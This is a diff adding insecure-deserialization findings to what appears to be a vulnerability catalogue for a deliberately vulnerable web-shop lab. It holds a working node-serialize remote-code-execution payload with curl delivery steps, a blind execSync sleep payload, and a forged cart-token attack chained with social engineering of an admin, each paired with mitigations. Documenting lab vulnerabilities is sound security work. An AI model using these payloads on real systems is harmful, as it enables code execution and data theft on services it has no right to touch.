@@ -328,6 +328,88 @@ V-SHOP-080  No rate limiting anywhere
 
 
 -----------------------------------------------------------------
+INSECURE DESERIALIZATION
+-----------------------------------------------------------------
+
+V-SHOP-100  Node deserialization RCE via /cart/import (CVE-2017-5941 class)
+  Location:  routes/cart.js  (serialize.unserialize(raw))
+  Sink:      node-serialize@0.0.4 .unserialize() evaluates any value
+             prefixed with "_$$ND_FUNC$$_" via eval. When the function
+             body ends with `()` (an IIFE), the function is invoked
+             during deserialization, producing arbitrary code execution
+             in the Node process context.
+  Exploit:
+    Step 1 - build the IIFE payload that reads the flag file and
+             writes it to a publicly served upload:
+
+      const serialize = require('node-serialize');
+      const evil = serialize.serialize({
+        items: [],
+        owner_id: 1,
+        rce: "_$$ND_FUNC$$_function(){require('fs').writeFileSync(" +
+             "'data/uploads/leak.txt'," +
+             "require('fs').readFileSync('data/.deserialize-flag','utf8'));}()"
+      });
+      const token = Buffer.from(evil).toString('base64');
+
+    Step 2 - POST the base64 token to /cart/import as the `token`
+             form field (any logged-in session works; new free
+             account is fine):
+
+      curl -b cookies.txt -d "token=<BASE64>" \
+           http://127.0.0.1:3002/cart/import
+
+    Step 3 - retrieve the flag from the public uploads dir:
+
+      curl http://127.0.0.1:3002/uploads/leak.txt
+      -> AccessibleBBB{deserialize-node-serialize-rce}
+
+  Mitigation:
+    1) Do not deserialize user-controlled data with a format that
+       supports code references (node-serialize, php unserialize,
+       python pickle, java ObjectInputStream, ruby Marshal, .NET
+       BinaryFormatter, YAML !!js/function, etc.).
+    2) Use a flat data format with no executable representation:
+       JSON.parse (NOT JSON.parse with a reviver that constructs
+       objects), MessagePack, Protocol Buffers, schema-validated
+       Zod / Joi / Yup objects.
+    3) If a "remember-me" or "share token" pattern is required,
+       sign and verify the token (JWT HS256 with a 32-byte key, or
+       HMAC over base64 ciphertext) and check the signature BEFORE
+       parsing the contents.
+    4) Reject node-serialize entirely: the package is unmaintained
+       since 2017 and every release ships the same RCE primitive.
+
+
+V-SHOP-101  Logic deserialization: cart token's owner_id is trusted
+  Location:  routes/cart.js  (parseInt(payload.owner_id, 10))
+  Exploit:   Forge a non-malicious cart token whose owner_id field
+             matches another user's account id; POST it to
+             /cart/import to push items into their cart. Chains
+             with V-SHOP-050 price tampering: insert qty=99 at
+             price_cents=1 into admin_kate's cart, then social-
+             engineer her to "complete checkout" of her own cart.
+  Mitigation:
+    Ignore any user identifier embedded in the token. Always derive
+    cart ownership from the authenticated session (req.session.userId).
+
+
+V-SHOP-102  Blind deserialization on /cart/import (no output reflected)
+  Location:  routes/cart.js  (the unserialize call returns nothing to
+             the client when the IIFE does not throw; you only see a
+             redirect)
+  Exploit:   Confirm code execution without console output via a
+             sleep gadget, then escalate to filesystem write:
+
+      "_$$ND_FUNC$$_function(){require('child_process')." +
+      "execSync('powershell -c Start-Sleep -s 4');}()"
+
+             If the /cart/import POST takes >4 s, RCE is confirmed.
+             Then send the file-write payload from V-SHOP-100.
+  Mitigation: same as V-SHOP-100.
+
+
+-----------------------------------------------------------------
 EXPLOIT QUICK-REFERENCE (PowerShell 5.1)
 -----------------------------------------------------------------
 
